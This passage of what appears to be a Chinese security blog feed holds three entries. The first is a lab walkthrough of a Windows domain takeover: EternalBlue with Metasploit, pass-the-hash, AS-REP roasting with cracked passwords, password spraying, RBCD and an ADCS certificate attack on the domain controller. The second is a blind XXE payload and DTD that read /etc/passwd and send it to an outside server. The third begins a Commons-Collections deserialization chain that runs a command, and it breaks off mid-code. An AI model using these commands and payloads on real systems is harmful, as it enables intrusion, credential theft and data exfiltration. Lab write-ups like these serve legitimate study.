class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">13</span><br>   <span class="hljs-string">[-&gt;]</span>XR-DC01<br>   <span class="hljs-string">[-&gt;]</span><span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">13</span><br><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">18</span>    XR-CA.xiaorang.lab                  Windows Server <span class="hljs-number">2016</span> Standard <span class="hljs-number">14393</span><br><span class="hljs-string">[*]</span> NetBios <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">24</span>    WORKGROUP\XR-WIN08                  Windows Server <span class="hljs-number">2008</span> R2 Enterprise <span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span><br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">24</span>/www/sys/index.php code:<span class="hljs-number">200</span> len:<span class="hljs-number">135</span>    title:None<br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">26</span>       code:<span class="hljs-number">200</span> len:<span class="hljs-number">40503</span>  title:XIAORANG.LAB<br><span class="hljs-string">[+]</span> PocScan http://<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">15</span>.<span class="hljs-number">18</span> poc-yaml-active-directory-certsrv-detect<br></code></pre></td></tr></table></figure><ol><li>172.22.15.24：永恒之蓝漏洞MS17-010，&#x2F;www&#x2F;sys&#x2F;index.php  </li><li>172.22.15.18：XR-CA poc-yaml-active-directory-certsrv-detect</li><li>172.22.15.13：域控</li><li>172.22.15.35：XIAORANG\XR-0687 不清楚</li><li>172.22.15.26：已拿下</li></ol><p>考虑直接打24号机子的永恒之蓝，使用msf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">proxychains4 msfconsole<br>use exploit/windows/smb/ms17_010_eternalblue  <span class="hljs-comment"># 选择使用的模块</span><br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp_uuid  <span class="hljs-comment"># 设置payload，可以通过show payloads查看</span><br><span class="hljs-built_in">set</span> RHOSTS 172.22.15.24  <span class="hljs-comment"># 设置靶机的ip</span><br>exploit  <span class="hljs-comment"># 发起攻击</span><br></code></pre></td></tr></table></figure><p>hashdump拿到管理员哈希</p><p><img src="/../2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20251024202350887.png" alt="image-20251024202350887"></p><p>考虑pth登录</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains4</span> impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">0</span>e52d03e9b939997401466a0ec5a9cbc administrator@<span class="hljs-number">172.22.15.24</span> -dc-ip <span class="hljs-number">172.22.15.13</span> <br></code></pre></td></tr></table></figure><p>拿下flag02，并添加用户rdp维持权限</p><p><img src="/../2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20251024203023824.png" alt="image-20251024203023824"></p><h2 id="flag03"><a href="#flag03" class="headerlink" title="flag03"></a>flag03</h2><p>经过测试，24机不在域内</p><p>发现一对数据库的账密，考虑连接mysql</p><p><img src="/../2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20251024203123023.png" alt="image-20251024203123023"></p><p>连接成功发现很多用户，推测可能存在域用户</p><p><img src="/../2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20251024203328315.png" alt="image-20251024203328315"></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-symbol">admin@</span>xiaorang.lab<br><span class="hljs-symbol">chenjianhua@</span>xiaorang.lab<br><span class="hljs-symbol">huachunmei@</span>xiaorang.lab<br><span class="hljs-symbol">huzhigang@</span>xiaorang.lab<br><span class="hljs-symbol">jiaxiaoliang@</span>xiaorang.lab<br><span class="hljs-symbol">lihongxia@</span>xiaorang.lab<br><span class="hljs-symbol">liuqiang@</span>xiaorang.lab<br><span class="hljs-symbol">lixiaoliang@</span>xiaorang.lab<br><span class="hljs-symbol">lixiuying@</span>xiaorang.lab<br><span class="hljs-symbol">wangfang@</span>xiaorang.lab<br><span class="hljs-symbol">wanghao@</span>xiaorang.lab<br><span class="hljs-symbol">wanglihong@</span>xiaorang.lab<br><span class="hljs-symbol">wangwei@</span>xiaorang.lab<br><span class="hljs-symbol">wangyulan@</span>xiaorang.lab<br><span class="hljs-symbol">zhangli@</span>xiaorang.lab<br><span class="hljs-symbol">zhangwei@</span>xiaorang.lab<br><span class="hljs-symbol">zhangxinyu@</span>xiaorang.lab<br><span class="hljs-symbol">zhangyi@</span>xiaorang.lab<br></code></pre></td></tr></table></figure><p>没找到密码，考虑未预验证请求as，拿到login session key就可以离线解密</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains4</span> impacket-GetNPUsers xiaorang.lab/ -usersfile <span class="hljs-number">1</span>.txt -<span class="hljs-literal">no</span>-pass -dc-ip <span class="hljs-number">172.22.15.13</span> <br></code></pre></td></tr></table></figure><p><img src="/../2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20251024204001394.png" alt="image-20251024204001394"></p><p>拿到两个hash，使用john离线解密</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(kali㉿kali)-[~/Desktop]<br>└─$ john <span class="hljs-comment">--wordlist=/usr/share/wordlists/rockyou.txt hash2.txt</span><br><span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">encoding</span>: UTF<span class="hljs-number">-8</span><br>Loaded <span class="hljs-number">2</span> <span class="hljs-keyword">password</span> hashes <span class="hljs-keyword">with</span> <span class="hljs-number">2</span> different salts (krb5asrep, Kerberos <span class="hljs-number">5</span> <span class="hljs-keyword">AS</span>-REP etype <span class="hljs-number">17</span>/<span class="hljs-number">18</span>/<span class="hljs-number">23</span> [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES <span class="hljs-number">128</span>/<span class="hljs-number">128</span> AVX <span class="hljs-number">4</span>x])<br>Will run <span class="hljs-number">4</span> OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> <span class="hljs-keyword">or</span> Ctrl-C <span class="hljs-keyword">to</span> <span class="hljs-keyword">abort</span>, almost <span class="hljs-keyword">any</span> other key <span class="hljs-keyword">for</span> status<br><span class="hljs-number">1</span>qaz2wsx         ($krb5asrep$<span class="language-perl"><span class="hljs-number">23</span>$huachunmei<span class="hljs-variable">@xiaorang</span>.lab<span class="hljs-variable">@XIAORANG</span>.LAB)     </span><br><span class="language-perl">winniethepooh    (<span class="hljs-variable">$krb</span>5asrep$</span><span class="hljs-number">23</span>$lixiuying@xiaorang.lab@XIAORANG.LAB)     <br><span class="hljs-number">2</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> DONE (<span class="hljs-number">2025</span><span class="hljs-number">-10</span><span class="hljs-number">-24</span> <span class="hljs-number">08</span>:<span class="hljs-number">42</span>) <span class="hljs-number">200.0</span>g/s <span class="hljs-number">256000</span>p/s <span class="hljs-number">409600</span>c/s <span class="hljs-number">409600</span>C/s slimshady..hassan<br>Use the &quot;--show&quot; <span class="hljs-keyword">option</span> <span class="hljs-keyword">to</span> display <span class="hljs-keyword">all</span> <span class="hljs-keyword">of</span> the cracked passwords reliably<br><span class="hljs-keyword">Session</span> completed. <br>                             <br></code></pre></td></tr></table></figure><p>拿到两对账密，尝试密码喷洒</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains4</span> -q crackmapexec smb <span class="hljs-number">172.22.15.1</span>/<span class="hljs-number">24</span> -u <span class="hljs-string">&quot;lixiuying<span class="hljs-variable">@xiaorang</span>.lab&quot;</span> -p <span class="hljs-string">&quot;winniethepooh&quot;</span> <br></code></pre></td></tr></table></figure><p>发现35号机子可以登录，sharphound收集域内信息，lixiuying 对 XR-0687 具有 GenericWrite 权限</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">GenericWrite</span> 允许修改目标机器账户的属性（尤其是 RBCD 核心属性 msDS-AllowedToActOnBehalfOfOtherIdentity）<br></code></pre></td></tr></table></figure><p>先写入&#x2F;etc&#x2F;hosts，<code>/etc/hosts</code> 是 Linux 系统的 <strong>本地静态域名解析文件</strong>，优先解析，便于后面直接使用域名攻击</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.15.35</span> XR-<span class="hljs-number">0687</span>.xiaorang.lab<br></code></pre></td></tr></table></figure><p>打RBCD(基于资源的约束委派攻击)</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains4</span> impacket-addcomputer xiaorang.lab/lixiuying:<span class="hljs-string">&#x27;winniethepooh&#x27;</span> -dc-ip <span class="hljs-number">172.22.15.13</span> -dc-host xiaorang.lab -computer-name <span class="hljs-string">&#x27;HACK$&#x27;</span> -computer-pass <span class="hljs-string">&#x27;0x401<span class="hljs-variable">@admin</span>&#x27;</span><br></code></pre></td></tr></table></figure><p>域内普通用户默认拥有有限的机器账户创建权限,所以可以利用低权限的域用户创建一个新的机器用户</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">proxychains4 impacket-rbcd xiaorang.lab/lixiuying:<span class="hljs-string">&#x27;winniethepooh&#x27;</span> -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span> -action <span class="hljs-keyword">write</span> -<span class="hljs-keyword">delegate</span>-<span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;XR-0687$&#x27;</span> -<span class="hljs-keyword">delegate</span>-<span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;HACK$&#x27;</span><br></code></pre></td></tr></table></figure><p>利用lixiuying用户的 GenericWrite 权限设置新用户对本地最高权限用户XR-0687$的委派</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains4</span> impacket-getST xiaorang.lab/<span class="hljs-string">&#x27;HACK$&#x27;</span>:<span class="hljs-string">&#x27;0x401<span class="hljs-variable">@admin</span>&#x27;</span> -spn cifs/XR-<span class="hljs-number">0687</span>.xiaorang.lab -impersonate Administrator -dc-ip <span class="hljs-number">172.22.15.13</span><br></code></pre></td></tr></table></figure><p>S4U 协议可以代表任意用户发出请求，所以代表域管请求目标服务的SPN（CIFS是文件共享服务，对应445端口，默认开放）的服务票据</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">KRB5CCNAME</span>=Administrator.ccache<br></code></pre></td></tr></table></figure><p>导入环境变量</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains4</span> impacket-psexec administrator<span class="hljs-variable">@XR</span>-<span class="hljs-number">0687</span>.xiaorang.lab -k -<span class="hljs-literal">no</span>-pass -dc-ip <span class="hljs-number">172.22.15.13</span><br></code></pre></td></tr></table></figure><p>然后就可以无密码登录了</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stata">1. 用 <span class="hljs-keyword">ST</span> 完成 CIFS 服务认证（免密码登录）<br>当执行 impacket-psexec -k -<span class="hljs-keyword">no</span>-pass 时：<br>-k 表示 “使用 Kerberos 票据认证”，工具会读取 KRB5CCNAME 环境变量中的 CIFS <span class="hljs-keyword">ST</span>；<br>目标主机（XR-0687）收到请求后，会验证 <span class="hljs-keyword">ST</span> 的合法性（检查签名、权限等），确认是 “Administrator 发起的访问” 后，允许工具接入 CIFS 服务的核心功能（如 IPC$ 管道、ADMIN$ 共享）。<br>这一步相当于 “用 <span class="hljs-keyword">ST</span> 刷脸登录”，无需输入管理员密码，直接获得 CIFS 服务的管理员级访问权限。<br></code></pre></td></tr></table></figure><p><img src="/../2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20251024210316093.png" alt="image-20251024210316093"></p><p><img src="/../2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20251024210343530.png" alt="image-20251024210343530"></p><p>拿下XR0687的flag03</p><h2 id="flag04"><a href="#flag04" class="headerlink" title="flag04"></a>flag04</h2><p>接下来打adcs CVE-2022-26923</p><p>adcs信息收集 CA Name : xiaorang-XR-CA-CA</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains4</span> -q certipy-ad find -u lixiuying<span class="hljs-variable">@xiaorang</span>.lab -p winniethepooh -dc-ip <span class="hljs-number">172.22.15.13</span> -vulnerable -stdout<br></code></pre></td></tr></table></figure><p>poc 能利用certipy创建机器账户</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains4</span> certipy-ad account create -u lixiuying<span class="hljs-variable">@xiaorang</span>.lab -p winniethepooh -dc-ip <span class="hljs-number">172.22.15.13</span> -user Test2$ -pass Test1234 -dns <span class="hljs-string">&#x27;XR-DC01.xiaorang.lab&#x27;</span><br></code></pre></td></tr></table></figure><p>先添加一个域内机器用户</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains4</span> certipy-ad account create -u lixiuying<span class="hljs-variable">@xiaorang</span>.lab -p winniethepooh -dc-ip <span class="hljs-number">172.22.15.13</span> -user Test2 -pass Test1234 -dns <span class="hljs-string">&#x27;XR-DC01.xiaorang.lab&#x27;</span><br></code></pre></td></tr></table></figure><p>再申请证书模板</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains4</span> certipy-ad req -u Test2\$<span class="hljs-variable">@xiaorang</span>.lab -p Test1234 -target <span class="hljs-number">172.22.15.18</span> -ca <span class="hljs-string">&quot;xiaorang-XR-CA-CA&quot;</span> -template Machine<br></code></pre></td></tr></table></figure><p>将pfx证书文件拆分成证书和私钥</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">certipy-ad cert -pfx xr-dc01.pfx -nokey -<span class="hljs-keyword">out</span> <span class="hljs-keyword">user</span>.crt<br>certipy-ad cert -pfx xr-dc01.pfx -nocert -<span class="hljs-keyword">out</span> <span class="hljs-keyword">user</span>.key<br></code></pre></td></tr></table></figure><p>验证证书的可用性</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">proxychains4 python passthecert<span class="hljs-selector-class">.py</span> -action whoami -crt user<span class="hljs-selector-class">.crt</span> -key user<span class="hljs-selector-class">.key</span> -domain xiaorang<span class="hljs-selector-class">.lab</span> -dc-ip <span class="hljs-number">172.22</span>.<span class="hljs-number">15.13</span><br></code></pre></td></tr></table></figure><p><strong>证书提供了被域控信任的身份认证，且该身份具备修改域控属性的权限</strong>，则可以修改域控的属性，配置可控的机器用户到域控的RBCD</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">proxychains4 python passthecert.py -action write_rbcd -crt <span class="hljs-keyword">user</span>.crt -key <span class="hljs-keyword">user</span>.key -<span class="hljs-keyword">domain</span> xiaorang.lab -dc-ip <span class="hljs-number">172.22</span><span class="hljs-number">.15</span><span class="hljs-number">.13</span> -delegate-<span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;XR-DC01$&#x27;</span> -delegate-<span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;HACK$&#x27;</span><br></code></pre></td></tr></table></figure><p>再请求服务票据，导入环境变量</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">proxychains4 impacket-getST xiaorang.lab/HACK\$:0x401@admin -dc-ip 172.22.15.13 -spn cifs/XR-DC01.xiaorang.lab -impersonate Administrator<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">KRB5CCNAME</span>=Administrator.ccache <br></code></pre></td></tr></table></figure><p>再直接登录,拿flag04</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxychains4</span> impacket-psexec xiaorang.lab/Administrator<span class="hljs-variable">@xr</span>-dc01.xiaorang.lab -k -<span class="hljs-literal">no</span>-pass -target-ip <span class="hljs-number">172.22.15.13</span> -codec gbk<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>blind xxe</title>
    <link href="/2025/09/24/blind%20xxe/"/>
    <url>/2025/09/24/blind%20xxe/</url>
    
    <content type="html"><![CDATA[<h1 id="blind-xxe"><a href="#blind-xxe" class="headerlink" title="blind xxe"></a>blind xxe</h1><p>使用外部实体</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml">xmlInput=<span class="hljs-meta">&lt;?xml+version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE+root+SYSTEM+<span class="hljs-string">&quot;http://113.45.176.209:8888/evil.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;send;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后服务器上面建一个evil.dtd，8888端口起一个服务</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">eval</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://113.45.176.209:8888/?%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-perl"><span class="hljs-variable">%eval</span>;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="language-perl"><span class="hljs-variable">%send</span>;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cc1</title>
    <link href="/2025/09/24/cc1/"/>
    <url>/2025/09/24/cc1/</url>
    
    <content type="html"><![CDATA[<h1 id="cc1"><a href="#cc1" class="headerlink" title="cc1"></a>cc1</h1><h2 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求:"></a>环境要求:</h2><p>jdk&lt;8u71</p><p>cc依赖 3.2.1</p><p>下载源码方便调试</p><h2 id="链子："><a href="#链子：" class="headerlink" title="链子："></a>链子：</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><p>核心漏洞点是invoketransformer的tranform方法通过反射实现了任意类的任意方法调用，此处可以实现rce</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">public</span> <span class="hljs-keyword">Object</span> <span class="hljs-keyword">transform</span>(<span class="hljs-keyword">Object</span> <span class="hljs-keyword">input</span>) &#123;<br>        <span class="hljs-keyword">if</span> (input == <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>        try &#123;<br>            <span class="hljs-keyword">Class</span> cls = <span class="hljs-keyword">input</span>.getClass();<br>            <span class="hljs-keyword">Method</span> <span class="hljs-keyword">method</span> = cls.getMethod(iMethodName, iParamTypes);<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">method</span>.invoke(<span class="hljs-keyword">input</span>, iArgs);<br>                <br>        &#125;<br></code></pre></td></tr></table></figure><p>示例:  利用invokertranformer反射调用Runtime.getRuntime()的exec方法弹计算器</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gradle">InvokerTransformer invokerTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<br>        <span class="hljs-string">&quot;exec&quot;</span>,<br>        <span class="hljs-keyword">new</span> <span class="hljs-keyword">Class</span>[]&#123;String.<span class="hljs-keyword">class</span>&#125;,<br>        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;<br>);<br><span class="hljs-keyword">Runtime</span> <span class="hljs-keyword">runtime</span> = <span class="hljs-keyword">Runtime</span>.getRuntime();<br>invokerTransformer.transform(<span class="hljs-keyword">runtime</span>);<br><br></code></pre></td></tr></table></figure><p>而且invoketranformer可以直接构造</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">InvokerTransformer</span>(<span class="hljs-params">String methodName, Class[] paramTypes, Object[] <span class="hljs-keyword">args</span></span>)</span> &#123;<br>    super();<br>    iMethodName = methodName;<br>    iParamTypes = paramTypes;<br>    iArgs = <span class="hljs-keyword">args</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>则只需要去寻找哪些类里面调用了tranform方法，再把我们构造好的invoketranformer传入</p><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p>我们发现在tranformedmap类有一个checksetvalue方法，里面会调用tranform方法</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">protected</span> <span class="hljs-title class_">Object</span> <span class="hljs-title function_">checkSetValue</span>(<span class="hljs-params"><span class="hljs-title class_">Object</span> value</span>) &#123;<br>    <span class="hljs-keyword">return</span> valueTransformer.<span class="hljs-title function_">transform</span>(value);<br>&#125;<br></code></pre></td></tr></table></figure><p>此处存在两个问题</p><ul><li>1）<code>checkSetValue</code>方法是protected修饰的，无法直接调用，需要找到调用该方法的位置</li><li>2）方法中是valueTransformer调用的<code>transform()</code>方法，所以需要知道valueTransformer怎么来的</li></ul><h3 id="先解决问题2，跟进一下valueTransformer查看它的赋值"><a href="#先解决问题2，跟进一下valueTransformer查看它的赋值" class="headerlink" title="先解决问题2，跟进一下valueTransformer查看它的赋值"></a>先解决问题2，跟进一下valueTransformer查看它的赋值</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-title">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;<br>    <span class="hljs-built_in">super</span>(map);<br>    <span class="hljs-keyword">this</span>.keyTransformer = keyTransformer;<br>    <span class="hljs-keyword">this</span>.valueTransformer = valueTransformer;<br>&#125;<br></code></pre></td></tr></table></figure><p>发现是发现了，但是是私有的没法在外面使用</p><p>继续查找发现了一个装饰器，调用了构造方法同时返回了这个类（那还说啥）</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">public</span> static <span class="hljs-built_in">Map</span> decorateTransform(<span class="hljs-built_in">Map</span> <span class="hljs-built_in">map</span>, Transformer keyTransformer, Transformer valueTransformer) &#123;<br>    TransformedMap decorated = <span class="hljs-literal">new</span> TransformedMap(<span class="hljs-built_in">map</span>, keyTransformer, valueTransformer); <span class="hljs-comment">//此处调用了构造方法</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">map</span>.size() &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">Map</span> transformed = decorated.transformMap(<span class="hljs-built_in">map</span>);<br>        decorated.clear();<br>        decorated.getMap().putAll(transformed);  <span class="hljs-comment">// avoids double transformation</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> decorated;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="再来看问题1，赋值解决了，如何调用checkSetValue方法"><a href="#再来看问题1，赋值解决了，如何调用checkSetValue方法" class="headerlink" title="再来看问题1，赋值解决了，如何调用checkSetValue方法"></a>再来看问题1，赋值解决了，如何调用checkSetValue方法</h3><p>查找用法，只有一个地方调用了它</p><p>AbstractInputCheckedMapDecorator的子类MapEntry的setvalue方法</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-title class_">Object</span> <span class="hljs-title function_">setValue</span>(<span class="hljs-params"><span class="hljs-title class_">Object</span> value</span>) &#123;<br>           value = parent.<span class="hljs-title function_">checkSetValue</span>(value);<br>           <span class="hljs-keyword">return</span> entry.<span class="hljs-title function_">setValue</span>(value);<br>       &#125;<br></code></pre></td></tr></table></figure><p>问题就变成了setvalue怎么调用，怎么赋值</p><p>首先是怎么构造一个MapEntry类</p><p>发现了一条构造类的链子:</p><p>AbstractInputCheckedMapDecorator.entrySet()  构造一个EntrySet类</p><p>EntrySet.iterator()                                                       构造一个EntrySetIterator类</p><p>EntrySetIterator.netx()                                                构造一个MapEntry类</p><p>因为AbstractInputCheckedMapDecorator 抽象类是不能实例化的，恰好tranformedmap是他的子类</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gradle">InvokerTransformer invokerTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<br>        <span class="hljs-string">&quot;exec&quot;</span>,<br>        <span 